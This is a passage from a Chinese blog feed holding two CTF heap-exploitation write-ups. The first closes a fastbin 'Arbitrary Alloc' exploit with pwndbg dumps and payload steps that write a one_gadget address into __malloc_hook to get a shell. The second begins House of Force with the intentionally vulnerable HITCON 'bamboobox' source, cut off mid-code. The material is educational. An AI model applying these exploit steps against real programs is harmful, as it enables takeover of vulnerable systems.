class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x71</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x5555557570d0</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x5555557570f0</span><br>Size: <span class="hljs-number">0x90</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757180</span><br>Size: <span class="hljs-number">0x20e61</span><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="2-3-修改index4的fd指针"><a href="#2-3-修改index4的fd指针" class="headerlink" title="2-3-修改index4的fd指针"></a>2-3 修改index4的fd指针</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1aed</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#更改index4的fd指针</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5（unsortedbin）</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/16gx <span class="hljs-number">0x00007ffff7dd1aed</span><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:<span class="hljs-number">0xfff7dd0260000000</span><span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>:<span class="hljs-number">0xfff7a92ea0000000</span><span class="hljs-number">0xfff7a92a7000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:<span class="hljs-number">0x000000000000007f</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="hljs-number">29</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="hljs-number">45</span>&gt;:<span class="hljs-number">0x5555757080000000</span><span class="hljs-number">0x0000000000000055</span><br><span class="hljs-number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="hljs-number">61</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-4-控制-malloc-hook"><a href="#2-4-控制-malloc-hook" class="headerlink" title="2-4-控制-malloc-hook"></a>2-4 控制__malloc_hook</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index7</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000060</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br><span class="hljs-number">0x5fcead987c0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000060</span><br>    <span class="hljs-comment">#index7</span><br><span class="hljs-number">0x5fcead987d0</span>:<span class="hljs-number">0x00007ffff7dd1afd</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-5-写入-one-gadget-并-getshell"><a href="#2-5-写入-one-gadget-并-getshell" class="headerlink" title="2-5-写入-one-gadget-并-getshell"></a>2-5 写入 one_gadget 并 getshell</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br>gdb.attach(p)<br></code></pre></td></tr></tbody></table></figure><h4 id="2-6-最后申请一个chunk"><a href="#2-6-最后申请一个chunk" class="headerlink" title="2-6-最后申请一个chunk"></a>2-6 最后申请一个chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>最后就能get shell 了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;strong&gt;fastbin_attack中的Arbitrary Alloc（例题）&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;具体例子原理网上很多，这里就不再赘述了，这里讲解一道&lt;strong&gt;fastbin_attack中的Arbitrary Alloc&lt;/strong&gt;&lt;</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="https://kylinxin.github.io/2023/09/12/House%20of%20Force/"/>
    <id>https://kylinxin.github.io/2023/09/12/House%20of%20Force/</id>
    <published>2023-09-12T15:14:29.000Z</published>
    <updated>2023-09-13T07:29:40.853Z</updated>
    
    <content type="html"><![CDATA[<h1>House Of Force（控制top_chunk）（基础）</h1><blockquote><p>参考资料：<br>CTF-wiki：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a><br>附件下载：<br>链接: <a href="https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA">https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA</a>  密码: np57<br>–来自百度网盘超级会员V3的分享<br>House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。</p></blockquote><blockquote><p>题目来源：HITCON training lab 11<br>附件：<br>链接: <a href="https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ">https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ</a>  密码: abtk<br>–来自百度网盘超级会员V3的分享</p></blockquote><hr><h2 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h2><p>老规矩，checksec一下文件先</p><p class='item-img' data-src='https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png'><img src="https://s2.loli.net/2023/09/12/Pph1H9f6lM5enLQ.png" alt="Snipaste_2023-09-12_17-08-13.png"></p><p>计算一下 main_arena 距离 libc 的距离</p><p class='item-img' data-src='https://s2.loli.net/2023/09/12/xrSK93Ij7bPctEV.png'><img src="https://s2.loli.net/2023/09/12/xrSK93Ij7bPctEV.png" alt="Snipaste_2023-09-12_20-25-47.png"></p><h2 id="程序源代码©"><a href="#程序源代码©" class="headerlink" title="程序源代码©"></a>程序源代码©</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> {</span><br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-type">char</span> *name;<br>};<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span> <span class="hljs-title">itemlist</span>[100] =</span> {<span class="hljs-number">0</span>};<br><br><span class="hljs-type">int</span> num;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hello_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is a box with magic"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"what do you want to do in the box"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">goodbye_message</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Thanks you"</span>);<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">box</span> {</span><br>  <span class="hljs-type">void</span> (*hello_message)();<br>  <span class="hljs-type">void</span> (*goodbye_message)();<br>};<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bamboobox Menu"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the items in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new item"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the item in the box"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"----------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_item</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (itemlist[i].name) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d : %s"</span>, i, itemlist[i].name);<br>      }<br>    }<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">""</span>);<br>  }<br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> sizebuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">if</span> (num &lt; <span class="hljs-number">100</span>) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>    read(<span class="hljs-number">0</span>, sizebuf, <span class="hljs-number">8</span>);<br>    length = atoi(sizebuf);<br>    <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"invaild length"</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {<br>      <span class="hljs-keyword">if</span> (!itemlist[i].name) {<br>        itemlist[i].size = length;<br>        itemlist[i].name = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(length);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the name of item:"</span>);<br>        size = read(<span class="hljs-number">0</span>, itemlist[i].name, length);<br>        itemlist[i].name[size] = <span class="hljs-string">'\x00'</span>;<br>        num++;<br>        <span class="hljs-keyword">break</span>;<br>      }<br>    }<br><br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"the box is full"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">()</span> {<br><br>  <span class="hljs-type">char</span> indexbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">char</span> lengthbuf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">int</span> length;<br>  <span class="hljs-type">int</span> index;<br>  <span class="hljs-type">int</span> readsize;<br><br>  <span class="hljs-keyword">if</span> (!num) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No item in the box"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of item:"</span>);<br>    read(<span class="hljs-number">0</span>, indexbuf, <span class="hljs-number">8</span>);<br>    index = atoi(indexbuf);<br>    <span class="hljs-keyword">if</span> (itemlist[index].name) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the length of item name:"</span>);<br>      read(<span class="hljs-number">0</span>, lengthbuf, <span class="hljs-number">8</span>);<br>      length = atoi(lengthbuf);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the new name of the item:"</span>);<br>      readsize = read(<span class="hljs-number">0</span>, itemlist[index].name, 